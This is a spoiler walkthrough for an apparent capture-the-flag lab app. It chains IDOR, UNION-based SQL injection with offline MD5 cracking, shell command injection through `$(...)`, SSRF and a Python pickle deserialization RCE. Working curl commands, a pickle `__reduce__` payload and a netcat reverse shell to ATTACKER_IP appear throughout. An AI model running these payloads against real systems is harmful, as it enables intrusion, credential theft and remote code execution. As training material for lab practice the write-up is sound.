# Solution Walkthrough — SPOILERS

Stop here if you haven't at least tried each stage yourself. This is the
full solve, written up so you can check your work or get unstuck — not a
starting point.

Assumes the app is running at `http://localhost:8080`.

---

## Flag 1 — IDOR on `/shipments/:id`

1. Register an account: `POST /register` with a username/password of your choice, then log in.
2. `/dashboard` shows only your own shipments (id 5+, depending on registration order), fetched via a query correctly scoped to `WHERE user_id = ?`.
3. `/shipments/:id`, however, does **not** check that the shipment belongs to the logged-in user — it just looks up the id. Walk the id space:

```bash
for i in 1 2 3 4 5; do curl -s -b cookies.txt http://localhost:8080/shipments/$i | grep -o 'MERIDIAN{[^}]*}'; done
```

Shipment `4` belongs to the `admin` account and contains the flag plus a note revealing the internal service hostname: `http://internal:5000`.

## Flag 2 — SQL injection → offline crack → admin login

1. `/shipments/search?q=` builds its query by string concatenation:
   ```
   SELECT id, tracking_number, origin, destination, status, notes FROM shipments
   WHERE tracking_number LIKE '%<q>%' OR origin LIKE '%<q>%' OR destination LIKE '%<q>%'
   ```
   The query and its 6 selected columns are fully attacker-controlled. Confirm injection with a syntax-breaking `'`, then determine the column count (6) either by trial UNION or by reading the `Query error:` message the app returns on failure (verbose SQL errors are intentional here).

2. UNION the `users` table into the visible columns:

```bash
curl -s -b cookies.txt -G http://localhost:8080/shipments/search \
  --data-urlencode "q=zzznomatch%' UNION SELECT id, username, password_hash, hash_type, role, 'x' FROM users --"
```

   This dumps every account, including `admin`'s legacy MD5 hash (`hash_type = md5`) — the other accounts use bcrypt and won't be worth attacking offline.

3. Crack the MD5 hash (John/Hashcat, or a plain wordlist + `hashlib.md5` in a pinch — the password is a realistic "CompanyYear!" style pattern, well within rockyou-class wordlists).

4. Log in as `admin` with the cracked password. `/admin` shows Flag 2 directly.

## Flag 3 — Command injection via the "convert" feature

`/admin` has a "Convert existing file" form that hits:

```
GET /admin/convert?file=<name>
```

Server-side this runs:

```js
exec(`file "uploads/${filename}" 2>&1`, ...)
```

The double quotes block naive `;`/`&&` chaining, but **command substitution
still executes inside double quotes** in `sh`/`bash` — `$(...)` and
backticks are not neutralized by quoting. The flag is written to
`/app/flag3.txt` inside the container (not reachable via any HTTP route —
you have to read it through the injection):

```bash
curl -s -b admin_cookies.txt -G http://localhost:8080/admin/convert \
  --data-urlencode 'file=x.txt$(cat /app/flag3.txt)y.txt'
```

The flag shows up embedded in the `file` command's "cannot open" error
text, in both the stdout and stderr panels on the page. This is a genuine
shell RCE primitive — you can substitute any command, including a reverse
shell (`netcat-openbsd` and `curl` are installed in the `meridian-web`
image specifically so this is practical: `$(nc -e /bin/sh ATTACKER_IP 4444)`
if your `nc` build supports `-e`, or a `/dev/tcp` bash one-liner otherwise).

## Flag 4 — SSRF to the internal network

Two independent routes get you here — the RCE from Flag 3 alone is enough
(you can just `curl` from inside the container), but the app also has a
dedicated SSRF sink for players who want to demonstrate it without RCE:

```
POST /admin/webhook-test
url=http://internal:5000/status
```

```bash
curl -s -b admin_cookies.txt -X POST http://localhost:8080/admin/webhook-test \
  --data-urlencode "url=http://internal:5000/status"
```

The response body is reflected back to you, including Flag 4 and a note
about a leftover `/debug/render` endpoint on that same service — that's
your target for the last stage.

## Flag 5 — Insecure deserialization on the internal service

`meridian-internal`'s `/debug/render` endpoint base64-decodes a `data`
parameter and calls `pickle.loads()` on it directly — classic Python
insecure deserialization. Any object with a `__reduce__` that returns
`(callable, args)` gets `callable(*args)` executed during unpickling, and
the *return value* becomes the "result" the endpoint reflects back to you.

Build a payload locally:

```python
import pickle, base64, subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "/app/flag5.txt"],))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Then deliver it — either directly (if you've pivoted onto the `back`
network, e.g. via the Flag-3 RCE shell) or, since the internal service
isn't reachable from your host at all, proxy the POST through the RCE shell
on `meridian-web` (it has `curl`):

```bash
# from inside a shell on meridian-web (via the Flag 3 RCE)
curl -s -X POST http://internal:5000/debug/render \
  --data-urlencode "data=<payload from above>"
```

The response's `result` field contains the flag bytes:
`{"result": "b'MERIDIAN{p1ckl3_d3s3r14l1z4t10n_r00t}\\n'"}`

That completes the chain: anonymous registration → IDOR → SQLi + offline
crack → admin auth → command injection RCE → SSRF/pivot → deserialization
RCE on the internal tier.
